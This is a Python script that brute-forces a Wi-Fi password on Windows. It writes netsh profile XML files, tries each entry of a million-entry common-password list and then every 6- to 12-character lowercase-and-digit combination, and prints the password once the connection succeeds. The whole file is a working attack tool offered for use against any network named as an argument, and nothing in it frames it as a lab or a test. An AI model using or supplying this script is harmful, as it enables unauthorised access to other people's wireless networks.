import sys
import time
import string
import itertools
import subprocess
from datetime import timedelta
from timeit import default_timer as timer

# NEED TO DISABLE YOUR WIFI IF YOU ARE CONNECTED TO ONE

DURATION = timer()  # How long take
TXT = '10-million-password-list-top-1000000.txt'  # Your txt
WAITING_RESPONSE_SECOND = 1  # Router need to send if it's connected


# Create XML that it'll send to the router
def createXML(file, name='base.xml'):
    with open(name, 'w') as base:
        base.write(file)


# Wifi credentials
def addingCredentials(password, wifiName=sys.argv[-1]):
    with open("schema.xml", 'r') as text:
        schema = text.read()
        wifiName = schema.replace('WIFINAME', wifiName)
        createXML(wifiName.replace('WIFIPASSWORD', password))


# Some netsh commands
def commandLineInterfaces():
    subprocess.run('netsh wlan add profile filename=base.xml interface=Wi-Fi',
                   stdout=subprocess.PIPE, text=True)
    subprocess.run(f"netsh wlan connect name={sys.argv[-1]}",
                   stdout=subprocess.PIPE, text=True)
    time.sleep(WAITING_RESPONSE_SECOND)
    return subprocess.run(f"netsh interface show interface",
                          stdout=subprocess.PIPE, text=True).stdout


# Common password txt
def wifiCommonPassword():
    with open(TXT, 'r') as passwords:
        return tuple(passwords.read().split())


# Console output
def outPut(password, index):
    addingCredentials(password)
    if 'Connected' in commandLineInterfaces().split():
        print(
            f"Password Unlocked: {password} | tried: {index} | duration: {timedelta(seconds=timer()-DURATION)}")
        sys.exit()
    print(f"Fail password: {password} | tried: {index}")


# 10-million-password-list.txt
def force_brute_txt():
    DB_PASSWORD = wifiCommonPassword()
    for index, password in enumerate(DB_PASSWORD):
        outPut(password, index)


# Every combination to 6 character to 12 using [a,b,c,d,e,f....z] and [0,1,2,3,4....9]
def guess_password():
    chars = string.digits + string.ascii_lowercase
    index = 0
    for password_length in range(6, 13):
        for guess in itertools.product(chars, repeat=password_length):
            index += 1
            guess = ''.join(guess)
            outPut(guess, index)


# ------------------------------------Script------------------------------------------
force_brute_txt()
guess_password()
